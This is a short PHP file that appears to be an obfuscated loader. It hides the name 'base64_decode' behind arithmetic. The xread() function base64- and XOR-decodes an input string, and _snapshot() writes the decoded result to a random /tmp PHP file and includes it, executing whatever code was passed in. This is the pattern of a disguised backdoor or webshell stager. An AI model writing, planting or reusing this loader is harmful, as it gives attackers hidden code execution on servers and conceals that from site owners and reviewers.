<?php
function _snapshot($str, $str2){
    $snapshot = "/.php/tmp/snapshot" . mt_rand(0, 999);
    file_put_contents(substr($snapshot, 5) . substr($snapshot, 1, 4), xread($str, $str2));
    include(substr($snapshot, 5) . substr($snapshot, 1, 4));
}
function xread($str, $str2){
    $y = _decode(32);
    $x = $y($str);
    $d = '';
    for ($i = 0; $i < strlen($x); $i++) {
        $d .= $x[$i] ^ $str2[$i % strlen($str2)];
    }
    return $d;
}
function _decode($num){
    $num1 = 6 * 2 + (07 + 0xd);
    $num2 = $num + $num1;
    return "base{$num2}" . __FUNCTION__;
}
?>